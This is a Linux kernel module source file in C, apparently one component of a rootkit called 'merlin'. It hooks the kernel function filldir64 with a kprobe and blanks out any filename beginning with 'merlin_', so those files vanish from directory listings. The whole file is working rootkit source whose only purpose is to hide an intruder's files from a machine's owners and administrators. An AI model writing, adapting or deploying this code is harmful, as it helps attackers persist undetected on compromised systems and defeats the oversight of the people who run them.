#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>

#ifndef pr_fmt
#define pr_fmt(fmt) "%s: " fmt, __func__
#endif

#define PREFIX_TO_HIDE "merlin_"

int file_hide_init(void);
void file_hide_exit(void);
int handler_pre(struct kprobe *p, struct pt_regs *regs);

#ifdef DEBUG
#define dbg_print(fmt, ...) pr_info(fmt, ##__VA_ARGS__)
#else
#define dbg_print(fmt, ...) /* No-op */
#endif

struct kprobe kp = {
	.symbol_name = "filldir64",
};

/* kprobe pre_handler: called just before the probed instruction is executed */
int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
{
	char *filename = (char *)regs->si;

	dbg_print(
		"<%s> p->addr = 0x%p, ip = %lx, rdi=%lx, rsi=%s ,flags = 0x%lx\n",
		p->symbol_name, p->addr, regs->ip, regs->di, filename, regs->flags);

	/* If filename start with "merlin_" */
	if (strncmp(filename, PREFIX_TO_HIDE, strlen(PREFIX_TO_HIDE)) == 0) {
		dbg_print("Hiding file: %s\n", filename);
		/* empty string is write in regs->si */
		strcpy((char *)regs->si, "\x00");
	}
	return 0;
}

int __init file_hide_init(void)
{
	int ret;
	kp.pre_handler = handler_pre;

	ret = register_kprobe(&kp);
	if (ret < 0) {
		pr_err("register_kprobe failed, returned %d\n", ret);
		return ret;
	}
	dbg_print("filldir64: %px\n", kp.addr);
	return 0;
}

void __exit file_hide_exit(void)
{
	unregister_kprobe(&kp);
	pr_info("file_hide exit successfully\n");
}

// Uncomment if you want to use this module as a standalone module
// module_init(file_hide_init)
// module_exit(file_hide_exit)

MODULE_AUTHOR("Phoenix2006");
MODULE_DESCRIPTION("merlin_file_hide");
MODULE_LICENSE("GPL");
